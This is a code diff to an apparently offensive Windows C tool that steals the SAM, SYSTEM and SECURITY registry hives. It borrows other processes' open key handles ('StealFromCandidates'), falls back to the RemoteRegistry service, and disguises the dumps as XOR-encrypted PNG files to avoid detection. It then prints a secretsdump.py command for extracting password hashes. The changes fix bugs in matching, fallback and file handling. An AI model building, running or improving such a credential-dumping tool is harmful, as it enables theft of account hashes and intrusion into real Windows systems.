@@ -406,6 +406,7 @@ static void FindCandidates(USHORT keyTypeIdx, LPCWSTR keyPath, ULONG keyPathLen,
 
         WCHAR name[260];
         if (QueryKeyName(hDup, name, 260) &&
+            wcslen(name) == keyPathLen &&
             _wcsnicmp(name, keyPath, keyPathLen) == 0)
             AddCandidate(cl, (DWORD)e->UniqueProcessId, e->HandleValue,
                 e->GrantedAccess);
@@ -445,6 +446,7 @@ static BOOL StealFromCandidates(CANDLIST * cl, LPCWSTR keyPath, ULONG keyPathLen
 
         WCHAR name[260];
         if (QueryKeyName(hDup, name, 260) &&
+            wcslen(name) == keyPathLen &&
             _wcsnicmp(name, keyPath, keyPathLen) == 0) {
             st = pNtSaveKey(hDup, hFile);
             if (NT_SUCCESS(st)) {
@@ -486,10 +488,12 @@ static BOOL AcquireHive(LPCWSTR keyPath, ULONG keyPathLen, LPCWSTR remoteSub,
             wprintf(L"      PID %lu (%ls) access 0x%08lX\n",
                 cl.c[i].pid, img, cl.c[i].access);
         }
-        return StealFromCandidates(&cl, keyPath, keyPathLen, outFile, label);
+        if (StealFromCandidates(&cl, keyPath, keyPathLen, outFile, label))
+            return TRUE;
+        wprintf(L"  [*] passive candidates exhausted, falling back to broker\n");
     }
 
-    wprintf(L"  [*] no passive holders, using RemoteRegistry broker\n");
+    wprintf(L"  [*] using RemoteRegistry broker\n");
 
     DWORD origStart = 0;
     BOOL  svcReconf = FALSE, svcStarted = FALSE;
@@ -729,6 +733,7 @@ int wmain(int argc, wchar_t *argv[])
     if (!secWanted) secOut = NULL;
 
     WCHAR samTmp[MAX_PATH], sysTmp[MAX_PATH], secTmp[MAX_PATH];
+    secTmp[0] = L'\0';
     _snwprintf(samTmp, MAX_PATH, L"%ls.tmp", samOut);
     samTmp[MAX_PATH - 1] = L'\0';
     _snwprintf(sysTmp, MAX_PATH, L"%ls.tmp", sysOut);
@@ -795,9 +800,22 @@ int wmain(int argc, wchar_t *argv[])
     wprintf(L"\n══ Encoding output ══\n");
 
     if (rawMode) {
-        if (samOk) MoveFileW(samTmp, samOut);
-        if (sysOk) MoveFileW(sysTmp, sysOut);
-        if (secWanted && secOk) MoveFileW(secTmp, secOut);
+        if (samOk && !MoveFileExW(samTmp, samOut, MOVEFILE_REPLACE_EXISTING)) {
+            wprintf(L"  [!] raw output %ls not replaced: %lu (plaintext kept)\n",
+                samOut, GetLastError());
+            samOk = FALSE;
+        }
+        if (sysOk && !MoveFileExW(sysTmp, sysOut, MOVEFILE_REPLACE_EXISTING)) {
+            wprintf(L"  [!] raw output %ls not replaced: %lu (plaintext kept)\n",
+                sysOut, GetLastError());
+            sysOk = FALSE;
+        }
+        if (secWanted && secOk &&
+                !MoveFileExW(secTmp, secOut, MOVEFILE_REPLACE_EXISTING)) {
+            wprintf(L"  [!] raw output %ls not replaced: %lu (plaintext kept)\n",
+                secOut, GetLastError());
+            secOk = FALSE;
+        }
     } else {
         if (samOk) {
             BYTE samKey[XOR_KEY_SIZE];
@@ -848,7 +866,7 @@ int wmain(int argc, wchar_t *argv[])
     wprintf(L"║  Format: %-39ls║\n", rawMode ? L"raw hives" : L"PNG (XOR-encrypted, no regf in file)");
     wprintf(L"╚══════════════════════════════════════════════════╝\n");
 
-    if (samOk || sysOk || (secWanted && secOk)) {
+    if (!rawMode && (samOk || sysOk || (secWanted && secOk))) {
         wprintf(L"\n  Decode (keys saved alongside outputs):\n");
         if (samOk)
             wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", samOut, samOut);
@@ -856,12 +874,9 @@ int wmain(int argc, wchar_t *argv[])
             wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", sysOut, sysOut);
         if (secWanted && secOk)
             wprintf(L"    python3 decode.py $(cat %ls.key) %ls\n", secOut, secOut);
-        wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n\n");
     }
-
-    DeleteFileW(samTmp);
-    DeleteFileW(sysTmp);
-    DeleteFileW(secTmp);
+    if (samOk || sysOk || (secWanted && secOk))
+        wprintf(L"    secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL\n\n");
 
     BOOL allOk = (!samWanted || samOk) && (!sysWanted || sysOk) &&
                  (!secWanted || secOk);
